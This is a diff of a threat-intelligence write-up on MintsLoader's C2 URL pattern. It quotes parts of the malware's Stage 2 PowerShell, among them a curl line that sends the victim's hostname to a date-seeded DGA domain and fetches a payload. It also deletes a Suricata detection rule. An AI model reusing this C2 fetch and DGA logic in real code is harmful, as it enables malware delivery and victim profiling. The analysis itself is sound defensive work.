@@ -11,7 +11,7 @@ created: 2025-04-22
 
 # Phase 2 — C2 URL Pattern Analysis
 
-**Previous:** [[01-Phase1-Malware-Family]] | **Next:** [[03-Phase3-Infrastructure-WHOIS]]
+**Previous:** [[Phase1-Malware-Family](https://github.com/Kazu010101/Threat-Intelligence/blob/main/IOC-Investigation-MintsLoader/01-Phase1-Malware-Family.md)] | **Next:** [[Phase3-Infrastructure-WHOIS](https://github.com/Kazu010101/Threat-Intelligence/blob/main/IOC-Investigation-MintsLoader/03-Phase3-Infrastructure-WHOIS.md)]
 
 ---
 
@@ -58,28 +58,18 @@ $rand1 = -join ((48..57) + (97..122) | Get-Random -Count 10 | % {[char]$_});
 $basename = "$($rand1)htr$($findom)";
 ```
 
-![[powershell-htr-zoomed.png]]
+<img width="884" height="85" alt="image" src="https://github.com/user-attachments/assets/8892df1a-af04-45af-87a6-f029437bcb7f" />
+
 *Screenshot: MintsLoader Stage 2 PowerShell — `$basename` construction. `$rand1` provides the 10-character random prefix. `htr` is hardcoded. `$findom` is an undefined variable that defaults to empty, making the full suffix always `htr.php`. This is a coding mistake by the malware author that became a permanent, detectable C2 signature.*
 
-**Why this matters for detection:** Because `htr.php` is hardcoded — not randomised — it appears in every MintsLoader C2 request across every campaign. This makes it a reliable network detection rule:
-
-```
-SNORT/Suricata rule concept:
-alert http any any -> any any (
-  msg:"MintsLoader C2 htr.php beacon";
-  content:".top/"; http_uri;
-  content:"htr.php?id="; http_uri; distance:0;
-  content:"&key="; http_uri; distance:0;
-  content:"&s=mints"; http_uri; distance:0;
-  sid:9000001;
-)
-```
+**Why this matters for detection:** Because `htr.php` is hardcoded — not randomised — it appears in every MintsLoader C2 request across every campaign. This makes it a reliable network detection rule.
 
 ---
 
 ## 2.4 The `id=` Parameter — Victim Hostname Profiling
 
-![[vt-hostnames-highlighted.png]]
+<img width="1484" height="240" alt="image" src="https://github.com/user-attachments/assets/ce04de4c-2345-48a8-825e-b30982476690" />
+
 *Screenshot: VirusTotal Contacted URLs — `id=` parameter highlighted across multiple requests. Values include `AZURE-PC`, `DESKTOP-ET51AJO`, and `DESKTOP-B0T93D6`, each representing a different compromised machine's hostname.*
 
 The Stage 2 PowerShell source confirms the `id=` value is populated by:
@@ -101,7 +91,8 @@ $global:block = (curl -useb "http://$domain/$basename.php?id=$env:computername&k
 
 ## 2.5 The `key=` Parameter — Anti-Sandbox Validation
 
-![[powershell-stage2-full.png]]
+<img width="1269" height="534" alt="image" src="https://github.com/user-attachments/assets/7c6ceb07-afbe-45a3-9762-35e2ddf088d1" />
+
 *Screenshot: Recorded Future Figure 21 — Full Stage 2 PowerShell payload retrieval code. The `$seed` is derived from `[int](Get-Date).DayOfYear + 1995584850`, the `$rand` object uses `New-Object "System.Random"` seeded with this value to generate the DGA domain, and `$key` is derived from hardware checks (DAC type, cache memory) and sent in the C2 request.*
 
 The `key=` parameter is derived from a series of hardware fingerprinting checks performed by Stage 2. It functions as an **anti-sandbox gate**: the C2 server evaluates the key and decides whether to deliver the real payload or a decoy (such as AsyncRAT).
@@ -119,13 +110,14 @@ If key matches real hardware → C2 delivers GhostWeaver / StealC
 If key indicates sandbox/VM → C2 delivers decoy payload
 ```
 
-This mechanism makes automated sandbox analysis ineffective — sandboxes receive a harmless decoy and never see the real payload.
+This mechanism could make automated sandbox analysis ineffective — sandboxes receive a harmless decoy and never see the real payload.
 
 ---
 
 ## 2.6 DGA Domain Construction — `abgnmlahkdfnfhn.top`
 
-![[powershell-dga-highlighted.png]]
+<img width="645" height="219" alt="image" src="https://github.com/user-attachments/assets/bd295bb4-290c-47f7-b986-ff99238e8b09" />
+
 *Screenshot: MintsLoader Stage 2 PowerShell — `System.Random` object seeded with `DayOfYear + 1995584850`, looping 15 times (`$i = 5; $i -lt 15; $i++` generating indices into `"abcdefghijklmn"`), appending `.top`. This generates the exact 15-character lowercase domain pattern matching our IOC.*
 
 Breaking down the domain generation:
@@ -153,7 +145,7 @@ abgnmlahkdfnfhn.top
     TLD: .top ✅
 ```
 
-> **Important:** The DGA seed is date-dependent — a different domain is generated each day. This means `abgnmlahkdfnfhn.top` was valid on the specific date this sample was executed (corroborated by the 2024-08-06 scan date in VirusTotal). By the next day, the malware would generate a completely different domain, making IP/domain blocklists ineffective without regenerating the full DGA pool.
+> **Important:** The DGA seed is date-dependent — a different domain is generated each day. This means `abgnmlahkdfnfhn.top` was valid on the specific date this sample was executed (based on the 2024-08-06 scan date in VirusTotal). By the next day, the malware would generate a completely different domain, making IP/domain blocklists ineffective without regenerating the full DGA pool.
 
 ---
 
@@ -173,7 +165,7 @@ Orange Cyberdefense — the team that named MintsLoader — specifically stated 
 
 ## 2.8 Phase 2 Summary
 
-Every URL component independently matches a documented MintsLoader technical signature. No single component is ambiguous:
+Every URL components matche a documented MintsLoader technical signature:
 
 ```
 http://          → HTTP C2 (documented)
